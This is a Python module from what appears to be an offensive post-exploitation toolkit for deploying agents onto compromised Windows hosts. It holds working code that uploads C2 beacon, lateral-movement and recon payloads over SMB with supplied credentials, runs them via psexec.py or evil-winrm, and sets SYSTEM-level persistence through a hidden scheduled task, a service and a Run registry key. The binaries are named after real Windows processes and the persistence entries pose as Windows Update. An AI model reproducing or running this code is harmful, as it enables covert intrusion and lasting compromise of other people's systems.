#!/usr/bin/env python3
"""
Agent Deployment Module
Deploys agents and establishes persistence on compromised targets
"""

from typing import Tuple, Optional, List
from dataclasses import dataclass


@dataclass
class DeploymentPayload:
    """Represents a deployment payload"""
    name: str
    local_path: str
    remote_path: str
    description: str
    persistence_method: str = "none"  # none, scheduled_task, service, registry


class AgentDeployer:
    """
    Handles agent deployment and persistence establishment
    """
    
    def __init__(self):
        """Initialize agent deployer"""
        self.payloads = self._initialize_payloads()
    
    def _initialize_payloads(self) -> List[DeploymentPayload]:
        """Initialize default deployment payloads"""
        return [
            DeploymentPayload(
                name="beacon_agent",
                local_path="./payloads/beacon.exe",
                remote_path="C:\\Windows\\Temp\\svchost.exe",
                description="C2 beacon agent",
                persistence_method="scheduled_task"
            ),
            DeploymentPayload(
                name="lateral_agent",
                local_path="./payloads/lateral.exe",
                remote_path="C:\\Windows\\System32\\dllhost.exe",
                description="Lateral movement agent",
                persistence_method="service"
            ),
            DeploymentPayload(
                name="recon_agent",
                local_path="./payloads/recon.exe",
                remote_path="C:\\Windows\\Temp\\explorer.exe",
                description="Reconnaissance agent",
                persistence_method="none"
            )
        ]
    
    def generate_upload_command(self, payload: DeploymentPayload, target: str,
                                username: str, password: str, domain: str = None) -> str:
        """
        Generate command to upload payload
        
        Args:
            payload: Deployment payload
            target: Target system
            username: Username
            password: Password
            domain: Optional domain
            
        Returns:
            Upload command string
        """
        if domain:
            user_string = f"{domain}\\{username}"
        else:
            user_string = username
        
        # SMB upload command
        return f"""smbclient //{target}/C$ -U {user_string}%{password} -c 'put {payload.local_path} {payload.remote_path.replace("C:", "")}'"""
    
    def generate_execution_command(self, payload: DeploymentPayload) -> str:
        """
        Generate command to execute payload
        
        Args:
            payload: Deployment payload
            
        Returns:
            Execution command string
        """
        return payload.remote_path
    
    def generate_persistence_command(self, payload: DeploymentPayload) -> str:
        """
        Generate PowerShell command to establish persistence
        
        Args:
            payload: Deployment payload
            
        Returns:
            PowerShell persistence command
        """
        if payload.persistence_method == "scheduled_task":
            return f"""
$action = New-ScheduledTaskAction -Execute '{payload.remote_path}'
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
Register-ScheduledTask -TaskName 'WindowsUpdate' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
"""
        
        elif payload.persistence_method == "service":
            return f"""
sc.exe create 'WindowsUpdate' binPath= '{payload.remote_path}' start= auto DisplayName= 'Windows Update Service'
sc.exe description 'WindowsUpdate' 'Provides software updates for Windows'
sc.exe start 'WindowsUpdate'
"""
        
        elif payload.persistence_method == "registry":
            return f"""
Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SecurityUpdate' -Value '{payload.remote_path}'
"""
        
        else:
            return ""  # No persistence
    
    def get_deployment_script(self, payload: DeploymentPayload, target: str,
                            username: str, password: str, domain: str = None,
                            method: str = "psexec") -> str:
        """
        Generate complete deployment script
        
        Args:
            payload: Deployment payload
            target: Target system
            username: Username
            password: Password
            domain: Optional domain
            method: Deployment method (psexec, winrm, smb)
            
        Returns:
            Complete deployment script
        """
        if domain:
            cred_string = f"{domain}/{username}:{password}"
        else:
            cred_string = f"{username}:{password}"
        
        if method == "psexec":
            script = f"""#!/bin/bash
# Deployment script for {payload.name} on {target}

echo "[*] Uploading payload..."
smbclient //{target}/C$ -U {username}%{password} -c 'put {payload.local_path} {payload.remote_path.replace("C:", "")}'

echo "[*] Executing payload..."
psexec.py {cred_string}@{target} '{payload.remote_path}'

"""
            if payload.persistence_method != "none":
                persistence_cmd = self.generate_persistence_command(payload)
                script += f"""echo "[*] Establishing persistence..."
psexec.py {cred_string}@{target} 'powershell -Command "{persistence_cmd}"'

"""
            script += f"""echo "[+] Deployment complete"
"""
        
        elif method == "winrm":
            script = f"""#!/bin/bash
# Deployment script for {payload.name} on {target}

echo "[*] Uploading payload via SMB..."
smbclient //{target}/C$ -U {username}%{password} -c 'put {payload.local_path} {payload.remote_path.replace("C:", "")}'

echo "[*] Executing via WinRM..."
evil-winrm -i {target} -u {username} -p {password} -e '{payload.remote_path}'

"""
            if payload.persistence_method != "none":
                persistence_cmd = self.generate_persistence_command(payload)
                script += f"""echo "[*] Establishing persistence..."
evil-winrm -i {target} -u {username} -p {password} -e 'powershell -Command "{persistence_cmd}"'

"""
            script += f"""echo "[+] Deployment complete"
"""
        
        return script
    
    def get_cleanup_script(self, payload: DeploymentPayload, target: str,
                          username: str, password: str, domain: str = None) -> str:
        """
        Generate cleanup script to remove deployment
        
        Args:
            payload: Deployment payload
            target: Target system
            username: Username
            password: Password
            domain: Optional domain
            
        Returns:
            Cleanup script
        """
        if domain:
            cred_string = f"{domain}/{username}:{password}"
        else:
            cred_string = f"{username}:{password}"
        
        script = f"""#!/bin/bash
# Cleanup script for {payload.name} on {target}

echo "[*] Removing persistence..."
"""
        
        if payload.persistence_method == "scheduled_task":
            script += f"""psexec.py {cred_string}@{target} 'schtasks /delete /tn WindowsUpdate /f'
"""
        elif payload.persistence_method == "service":
            script += f"""psexec.py {cred_string}@{target} 'sc.exe stop WindowsUpdate'
psexec.py {cred_string}@{target} 'sc.exe delete WindowsUpdate'
"""
        elif payload.persistence_method == "registry":
            script += f"""psexec.py {cred_string}@{target} 'reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityUpdate /f'
"""
        
        script += f"""
echo "[*] Removing payload..."
psexec.py {cred_string}@{target} 'del /f {payload.remote_path}'

echo "[+] Cleanup complete"
"""
        
        return script
    
    def get_available_payloads(self) -> List[DeploymentPayload]:
        """Get all available payloads"""
        return self.payloads
    
    def add_payload(self, payload: DeploymentPayload) -> None:
        """Add custom payload"""
        self.payloads.append(payload)
